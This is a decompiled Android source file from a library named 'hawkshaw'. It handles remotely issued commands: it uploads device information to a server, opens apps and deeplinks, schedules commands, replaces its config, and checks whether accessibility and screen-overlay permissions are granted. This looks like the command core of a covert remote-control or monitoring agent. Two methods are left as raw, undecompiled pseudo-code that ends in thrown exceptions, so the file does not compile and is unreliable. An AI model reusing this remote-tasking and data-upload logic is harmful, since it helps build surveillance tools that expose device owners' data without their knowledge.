package com.hawkshaw.library.features.misc;

import E0.C0010a;
import F3.b;
import W2.y;
import Y1.K;
import a3.e;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.provider.Settings;
import b3.C0298a;
import com.hawkshaw.library.App;
import com.hawkshaw.library.Hawkshaw;
import com.hawkshaw.library.config.DynamicConfigKt;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.datalayer.models.DynamicConfig;
import com.hawkshaw.library.datalayer.network.twirp.interceptors.ContentNegotiationInterceptorKt;
import com.hawkshaw.library.handler.JobScheduler;
import com.hawkshaw.library.ktextensions.ManifestPermissionsKt;
import com.hawkshaw.library.logger.Logger;
import com.hawkshaw.library.preferences.Prefs;
import i.C0528x;
import java.util.ArrayList;
import me.pushy.sdk.lib.jackson.core.util.MinimalPrettyPrinter;
import me.pushy.sdk.lib.paho.internal.ClientDefaults;

public final class MiscKt {
    private static final String TAG = "Misc";

    public /* synthetic */ class WhenMappings {
        public static final /* synthetic */ int[] $EnumSwitchMapping$0;
        public static final /* synthetic */ int[] $EnumSwitchMapping$1;

        /* JADX WARNING: Can't wrap try/catch for region: R(27:0|(2:1|2)|3|(2:5|6)|7|9|10|11|12|13|14|15|16|17|18|19|20|(2:21|22)|23|25|26|27|28|29|30|31|33) */
        /* JADX WARNING: Can't wrap try/catch for region: R(28:0|1|2|3|(2:5|6)|7|9|10|11|12|13|14|15|16|17|18|19|20|(2:21|22)|23|25|26|27|28|29|30|31|33) */
        /* JADX WARNING: Failed to process nested try/catch */
        /* JADX WARNING: Missing exception handler attribute for start block: B:11:0x0022 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:13:0x002b */
        /* JADX WARNING: Missing exception handler attribute for start block: B:15:0x0034 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:17:0x003d */
        /* JADX WARNING: Missing exception handler attribute for start block: B:19:0x0046 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:21:0x0050 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:27:0x006b */
        /* JADX WARNING: Missing exception handler attribute for start block: B:29:0x0073 */
        static {
            
                com.hawkshaw.library.datalayer.models.Command$CommandType[] r0 = com.hawkshaw.library.datalayer.models.Command.CommandType.values()
                int r0 = r0.length
                int[] r0 = new int[r0]
                r1 = 1
                com.hawkshaw.library.datalayer.models.Command$CommandType r2 = com.hawkshaw.library.datalayer.models.Command.CommandType.PushDeviceInfo     // Catch:{ NoSuchFieldError -> 0x0010 }
                int r2 = r2.ordinal()     // Catch:{ NoSuchFieldError -> 0x0010 }
                r0[r2] = r1     // Catch:{ NoSuchFieldError -> 0x0010 }
            L_0x0010:
                r2 = 2
                com.hawkshaw.library.datalayer.models.Command$CommandType r3 = com.hawkshaw.library.datalayer.models.Command.CommandType.OpenApp     // Catch:{ NoSuchFieldError -> 0x0019 }
                int r3 = r3.ordinal()     // Catch:{ NoSuchFieldError -> 0x0019 }
                r0[r3] = r2     // Catch:{ NoSuchFieldError -> 0x0019 }
            L_0x0019:
                r3 = 3
                com.hawkshaw.library.datalayer.models.Command$CommandType r4 = com.hawkshaw.library.datalayer.models.Command.CommandType.OpenDeeplink     // Catch:{ NoSuchFieldError -> 0x0022 }
                int r4 = r4.ordinal()     // Catch:{ NoSuchFieldError -> 0x0022 }
                r0[r4] = r3     // Catch:{ NoSuchFieldError -> 0x0022 }
            L_0x0022:
                com.hawkshaw.library.datalayer.models.Command$CommandType r4 = com.hawkshaw.library.datalayer.models.Command.CommandType.GetDiagnosis     // Catch:{ NoSuchFieldError -> 0x002b }
                int r4 = r4.ordinal()     // Catch:{ NoSuchFieldError -> 0x002b }
                r5 = 4
                r0[r4] = r5     // Catch:{ NoSuchFieldError -> 0x002b }
            L_0x002b:
                com.hawkshaw.library.datalayer.models.Command$CommandType r4 = com.hawkshaw.library.datalayer.models.Command.CommandType.ScheduleCommand     // Catch:{ NoSuchFieldError -> 0x0034 }
                int r4 = r4.ordinal()     // Catch:{ NoSuchFieldError -> 0x0034 }
                r5 = 5
                r0[r4] = r5     // Catch:{ NoSuchFieldError -> 0x0034 }
            L_0x0034:
                com.hawkshaw.library.datalayer.models.Command$CommandType r4 = com.hawkshaw.library.datalayer.models.Command.CommandType.CancelScheduledCommand     // Catch:{ NoSuchFieldError -> 0x003d }
                int r4 = r4.ordinal()     // Catch:{ NoSuchFieldError -> 0x003d }
                r5 = 6
                r0[r4] = r5     // Catch:{ NoSuchFieldError -> 0x003d }
            L_0x003d:
                com.hawkshaw.library.datalayer.models.Command$CommandType r4 = com.hawkshaw.library.datalayer.models.Command.CommandType.StartInitializer     // Catch:{ NoSuchFieldError -> 0x0046 }
                int r4 = r4.ordinal()     // Catch:{ NoSuchFieldError -> 0x0046 }
                r5 = 7
                r0[r4] = r5     // Catch:{ NoSuchFieldError -> 0x0046 }
            L_0x0046:
                com.hawkshaw.library.datalayer.models.Command$CommandType r4 = com.hawkshaw.library.datalayer.models.Command.CommandType.SetDynamicConfig     // Catch:{ NoSuchFieldError -> 0x0050 }
                int r4 = r4.ordinal()     // Catch:{ NoSuchFieldError -> 0x0050 }
                r5 = 8
                r0[r4] = r5     // Catch:{ NoSuchFieldError -> 0x0050 }
            L_0x0050:
                com.hawkshaw.library.datalayer.models.Command$CommandType r4 = com.hawkshaw.library.datalayer.models.Command.CommandType.PushDynamicConfig     // Catch:{ NoSuchFieldError -> 0x005a }
                int r4 = r4.ordinal()     // Catch:{ NoSuchFieldError -> 0x005a }
                r5 = 9
                r0[r4] = r5     // Catch:{ NoSuchFieldError -> 0x005a }
            L_0x005a:
                $EnumSwitchMapping$0 = r0
                com.hawkshaw.library.datalayer.models.Command$PushDeviceInfoRequest$Type[] r0 = com.hawkshaw.library.datalayer.models.Command.PushDeviceInfoRequest.Type.values()
                int r0 = r0.length
                int[] r0 = new int[r0]
                com.hawkshaw.library.datalayer.models.Command$PushDeviceInfoRequest$Type r4 = com.hawkshaw.library.datalayer.models.Command.PushDeviceInfoRequest.Type.All     // Catch:{ NoSuchFieldError -> 0x006b }
                int r4 = r4.ordinal()     // Catch:{ NoSuchFieldError -> 0x006b }
                r0[r4] = r1     // Catch:{ NoSuchFieldError -> 0x006b }
            L_0x006b:
                com.hawkshaw.library.datalayer.models.Command$PushDeviceInfoRequest$Type r1 = com.hawkshaw.library.datalayer.models.Command.PushDeviceInfoRequest.Type.Dynamic     // Catch:{ NoSuchFieldError -> 0x0073 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0073 }
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0073 }
            L_0x0073:
                com.hawkshaw.library.datalayer.models.Command$PushDeviceInfoRequest$Type r1 = com.hawkshaw.library.datalayer.models.Command.PushDeviceInfoRequest.Type.Static     // Catch:{ NoSuchFieldError -> 0x007b }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x007b }
                r0[r1] = r3     // Catch:{ NoSuchFieldError -> 0x007b }
            L_0x007b:
                $EnumSwitchMapping$1 = r0
                return
            
            throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.misc.MiscKt.WhenMappings.<clinit>():void");
        }
    }

    private static final void cancelScheduledCommand(Command.CancelScheduledCommandRequest cancelScheduledCommandRequest) {
        if (cancelScheduledCommandRequest != null) {
            JobScheduler.INSTANCE.cancelScheduledCommand(cancelScheduledCommandRequest);
        }
    }

    private static final void getDiagnosis() {
        StringBuilder p4 = C0010a.p("Diagnosis\nLibVersion: 0.1.9\n\nApp Permissions\n");
        String[] permissionList = ManifestPermissionsKt.getPermissionList();
        ArrayList arrayList = new ArrayList(permissionList.length);
        for (String str : permissionList) {
            p4.append(str + MinimalPrettyPrinter.DEFAULT_ROOT_VALUE_SEPARATOR + (ManifestPermissionsKt.hasPermission(str) ? "granted" : "denied"));
            p4.append(10);
            arrayList.add(p4);
        }
        p4.append("IsAccessibilityEnabled: " + com.hawkshaw.library.utils.MiscKt.isAccessibilityEnabled$default((Context) null, 1, (Object) null));
        p4.append(10);
        p4.append("IsDrawOverAppsEnabled: " + Settings.canDrawOverlays(App.Companion.getContext()));
        p4.append(10);
        String sb = p4.toString();
        K.m(sb, "toString(...)");
        Logger.INSTANCE.d(TAG, sb, true);
    }

    public static final Object handleMiscCommand(Command command, e eVar) {
        int i5 = WhenMappings.$EnumSwitchMapping$0[command.getType().ordinal()];
        y yVar = y.f2418a;
        switch (i5) {
            case 1:
                Object pushDeviceInfo = pushDeviceInfo(command.getDeviceInfoRequest(), eVar);
                return pushDeviceInfo == C0298a.f4140D ? pushDeviceInfo : yVar;
            case 2:
                openApp(command.getOpenAppRequest());
                break;
            case 3:
                openDeeplink(command.getOpenDeeplinkRequest());
                break;
            case 4:
                getDiagnosis();
                break;
            case 5:
                scheduleCommand(command.getScheduleCommandRequest());
                break;
            case 6:
                cancelScheduledCommand(command.getCancelScheduledCommandRequest());
                break;
            case 7:
                startHawkshawInitializer();
                break;
            case 8:
                Command.SetDynamicConfigRequest setDynamicConfigRequest = command.getSetDynamicConfigRequest();
                if (setDynamicConfigRequest != null) {
                    Prefs.INSTANCE.setDynamicConfig(setDynamicConfigRequest.getConfig());
                    break;
                }
                break;
            case 9:
                Logger logger = Logger.INSTANCE;
                b json = ContentNegotiationInterceptorKt.getJson();
                DynamicConfig dynamicConfig = DynamicConfigKt.getDynamicConfig();
                json.getClass();
                logger.log(TAG, "DynamicConfig: ".concat(json.b(DynamicConfig.Companion.serializer(), dynamicConfig)), true);
                break;
        }
        return yVar;
    }

    private static final void openApp(Command.OpenAppRequest openAppRequest) {
        if (openAppRequest != null) {
            Intent launchIntentForPackage = App.Companion.getContext().getPackageManager().getLaunchIntentForPackage(openAppRequest.getPackageName());
            if (launchIntentForPackage != null) {
                launchIntentForPackage.addFlags(ClientDefaults.MAX_MSG_SIZE);
                Logger.d$default(Logger.INSTANCE, TAG, C0528x.h("Start activity intent called for ", openAppRequest.getPackageName()), false, 4, (Object) null);
            } else {
                launchIntentForPackage = new Intent("android.intent.action.VIEW");
                launchIntentForPackage.addFlags(ClientDefaults.MAX_MSG_SIZE);
                String packageName = openAppRequest.getPackageName();
                launchIntentForPackage.setData(Uri.parse("market://details?id=" + packageName));
                Logger.d$default(Logger.INSTANCE, TAG, C0528x.h("Market view intent called for ", openAppRequest.getPackageName()), false, 4, (Object) null);
            }
            com.hawkshaw.library.utils.MiscKt.startActivity$default(launchIntentForPackage, (String) null, (String) null, (Context) null, 14, (Object) null);
        }
    }

    private static final void openDeeplink(Command.OpenDeeplinkRequest openDeeplinkRequest) {
        if (openDeeplinkRequest != null) {
            try {
                Intent intent = new Intent("android.intent.action.VIEW");
                intent.setData(Uri.parse(openDeeplinkRequest.getDeeplink()));
                intent.setFlags(ClientDefaults.MAX_MSG_SIZE);
                com.hawkshaw.library.utils.MiscKt.startActivity$default(intent, (String) null, (String) null, (Context) null, 14, (Object) null);
            } catch (Exception e5) {
                Logger.e$default(Logger.INSTANCE, TAG, C0528x.e("OpenDeeplink: ", openDeeplinkRequest.getDeeplink(), ", ", e5.getMessage()), (Exception) null, false, 12, (Object) null);
            }
        }
    }

    /* JADX WARNING: type inference failed for: r0v2, types: [c3.c] */
    /* access modifiers changed from: private */
    /* JADX WARNING: Multi-variable type inference failed */
    /* JADX WARNING: Removed duplicated region for block: B:16:0x0045  */
    /* JADX WARNING: Removed duplicated region for block: B:36:0x00a6 A[RETURN] */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x0026  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object pushDeviceInfo(com.hawkshaw.library.datalayer.models.Command.PushDeviceInfoRequest r10, a3.e r11) {
        
            boolean r0 = r11 instanceof Q1.c
            if (r0 == 0) goto L_0x0013
            r0 = r11
            Q1.c r0 = (Q1.c) r0
            int r1 = r0.f1790F
            r2 = -2147483648(0xffffffff80000000, float:-0.0)
            r3 = r1 & r2
            if (r3 == 0) goto L_0x0013
            int r1 = r1 - r2
            r0.f1790F = r1
            goto L_0x0018
        L_0x0013:
            Q1.c r0 = new Q1.c
            r0.<init>(r11)
        L_0x0018:
            java.lang.Object r11 = r0.f1789E
            b3.a r1 = b3.C0298a.f4140D
            int r2 = r0.f1790F
            W2.y r3 = W2.y.f2418a
            r4 = 3
            r5 = 2
            r6 = 0
            r7 = 1
            if (r2 == 0) goto L_0x0045
            if (r2 == r7) goto L_0x003f
            if (r2 == r5) goto L_0x0039
            if (r2 != r4) goto L_0x0031
            Y1.C0110h.P(r11)
            goto L_0x00a7
        L_0x0031:
            java.lang.IllegalStateException r10 = new java.lang.IllegalStateException
            java.lang.String r11 = "call to 'resume' before 'invoke' with coroutine"
            r10.<init>(r11)
            throw r10
        L_0x0039:
            com.hawkshaw.library.datalayer.models.Command$PushDeviceInfoRequest r10 = r0.f1788D
            Y1.C0110h.P(r11)
            goto L_0x0077
        L_0x003f:
            com.hawkshaw.library.datalayer.models.Command$PushDeviceInfoRequest r10 = r0.f1788D
            Y1.C0110h.P(r11)
            goto L_0x0087
        L_0x0045:
            Y1.C0110h.P(r11)
            if (r10 != 0) goto L_0x004b
            return r3
        L_0x004b:
            com.hawkshaw.library.datalayer.models.Command$PushDeviceInfoRequest$Type r11 = r10.getType()
            int[] r2 = com.hawkshaw.library.features.misc.MiscKt.WhenMappings.$EnumSwitchMapping$1
            int r11 = r11.ordinal()
            r11 = r2[r11]
            if (r11 == r7) goto L_0x007a
            if (r11 == r5) goto L_0x006a
            if (r11 != r4) goto L_0x0064
            com.hawkshaw.library.deviceinfo.DeviceInfo r11 = com.hawkshaw.library.deviceinfo.DeviceInfo.INSTANCE
            kotlinx.serialization.json.c r11 = com.hawkshaw.library.deviceinfo.DeviceInfo.getStaticDeviceInfo$default(r11, r6, r7, r6)
            goto L_0x0089
        L_0x0064:
            W2.x r10 = new W2.x
            r10.<init>()
            throw r10
        L_0x006a:
            com.hawkshaw.library.deviceinfo.DeviceInfo r11 = com.hawkshaw.library.deviceinfo.DeviceInfo.INSTANCE
            r0.f1788D = r10
            r0.f1790F = r5
            java.lang.Object r11 = com.hawkshaw.library.deviceinfo.DeviceInfo.getDynamicDeviceInfo$default(r11, r6, r0, r7, r6)
            if (r11 != r1) goto L_0x0077
            return r1
        L_0x0077:
            kotlinx.serialization.json.c r11 = (kotlinx.serialization.json.c) r11
            goto L_0x0089
        L_0x007a:
            com.hawkshaw.library.deviceinfo.DeviceInfo r11 = com.hawkshaw.library.deviceinfo.DeviceInfo.INSTANCE
            r0.f1788D = r10
            r0.f1790F = r7
            java.lang.Object r11 = r11.getDeviceInfo(r0)
            if (r11 != r1) goto L_0x0087
            return r1
        L_0x0087:
            kotlinx.serialization.json.c r11 = (kotlinx.serialization.json.c) r11
        L_0x0089:
            com.hawkshaw.library.datalayer.Injector$Companion r2 = com.hawkshaw.library.datalayer.Injector.Companion
            com.hawkshaw.library.datalayer.Injector r2 = r2.getInstance()
            com.hawkshaw.library.datalayer.network.service.AppService r2 = r2.getAppService()
            com.hawkshaw.library.datalayer.models.PushDeviceInfoRequest r5 = new com.hawkshaw.library.datalayer.models.PushDeviceInfoRequest
            com.hawkshaw.library.datalayer.models.Command$PushDeviceInfoRequest$Type r10 = r10.getType()
            r5.<init>(r10, r11)
            r0.f1788D = r6
            r0.f1790F = r4
            java.lang.Object r11 = r2.pushDeviceInfo(r5, r0)
            if (r11 != r1) goto L_0x00a7
            return r1
        L_0x00a7:
            com.hawkshaw.library.datalayer.network.twirp.ApiResponse r11 = (com.hawkshaw.library.datalayer.network.twirp.ApiResponse) r11
            com.hawkshaw.library.logger.Logger r4 = com.hawkshaw.library.logger.Logger.INSTANCE
            java.lang.String r10 = r11.getState()
            java.lang.String r11 = "PushDeviceInfo: "
            java.lang.String r6 = i.C0528x.h(r11, r10)
            java.lang.String r5 = "Misc"
            r7 = 0
            r8 = 4
            r9 = 0
            com.hawkshaw.library.logger.Logger.d$default(r4, r5, r6, r7, r8, r9)
            return r3
        
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.misc.MiscKt.pushDeviceInfo(com.hawkshaw.library.datalayer.models.Command$PushDeviceInfoRequest, a3.e):java.lang.Object");
    }

    private static final void scheduleCommand(Command.ScheduleCommandRequest scheduleCommandRequest) {
        if (scheduleCommandRequest != null) {
            JobScheduler.INSTANCE.scheduleCommand(scheduleCommandRequest);
        }
    }

    private static final void startHawkshawInitializer() {
        Hawkshaw.initFromInternalActivity(false);
    }
}
